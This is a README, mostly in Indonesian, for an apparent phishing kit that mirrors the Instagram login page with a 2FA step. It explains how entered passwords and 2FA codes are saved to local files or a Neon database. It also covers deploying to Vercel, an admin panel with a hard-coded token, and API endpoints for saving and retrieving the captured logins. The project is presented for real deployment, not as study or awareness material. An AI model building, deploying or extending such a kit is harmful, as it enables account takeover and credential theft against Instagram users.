# Instagram Login Page Mirror

Instagram login page mirror with 2FA. Dark/light theme otomatis.

## Local dev

```
node server.js
```

Buka `http://localhost:3000`. Data login & 2FA tersimpan ke `_saved_logins/*.txt`.

## Vercel + Neon deploy

- Deploy repo ke Vercel (hubungkan GitHub repo)
- Buat database [Neon](https://neon.tech) (free tier cukup)
- Set env `DATABASE_URL` di dashboard Vercel
- API functions di `api/` folder otomatis jalan sebagai serverless functions
- Data masuk ke tabel `logins` di Neon

## Admin Panel

Buka `/admin123` di browser. Token: `2026` (atau set env `PANEL_TOKEN`).

## API

| Endpoint | Method | Body/Query | Fungsi |
|---|---|---|---|
| `/api/save-login` | POST | `{ email, password }` | Simpan login |
| `/api/save-code` | POST | `{ email, code }` | Simpan kode 2FA |
| `/api/get-logins` | GET | `?token=2026` | Ambil semua data login |
| `/api/delete-login` | POST | `?token=2026` body `{ id }` | Hapus data login by ID |

## Routing

- `server.js` — lokal, route `/` based on User-Agent: desktop → `index.html`, mobile → `indexm.html`
- `indexmobile.html` tidak diserve oleh server lokal (buka langsung)
- Vercel — static files dari root, API dari `api/` folder

## Files

- `index.html` — desktop login (mirror Instagram full desktop)
- `indexm.html` — mobile login (custom, dark/light theme, 2FA enabled)
- `indexmobile.html` — mobile login (mirror Instagram touch login, not served by default)
- `mainfest.json` — desktop PWA manifest (intentional typo "mainfest")
- `mainfastmobile.json` — mobile PWA manifest
- `image.png`, `logolight.png` — Instagram logo (dark/light)
- `meta.png`, `metalight.png`, `metadark.png` — Meta logo (dark/light)

## Key details

- `_saved_logins/` — local dev only, jangan di-commit
- `DATABASE_URL` env var — required for Vercel/Neon
- `node_modules/` dikomit? Boleh, Vercel butuh untuk install `pg`. Atau pakai `vercel.json` build config.
